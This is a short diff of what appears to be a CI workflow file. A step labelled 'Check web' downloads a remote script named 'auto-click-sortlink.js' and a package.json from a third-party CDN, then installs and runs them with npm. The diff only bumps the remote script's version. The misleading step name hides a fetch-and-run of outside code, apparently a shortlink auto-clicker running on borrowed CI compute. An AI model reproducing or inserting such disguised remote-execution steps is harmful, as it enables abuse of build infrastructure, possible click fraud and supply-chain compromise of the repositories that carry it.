@@ -11,4 +11,4 @@ jobs:
     steps:
     - name: Check web
       run: |
-        curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/auto-click-sortlink.js2 --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
+        curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/auto-click-sortlink.js4 --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
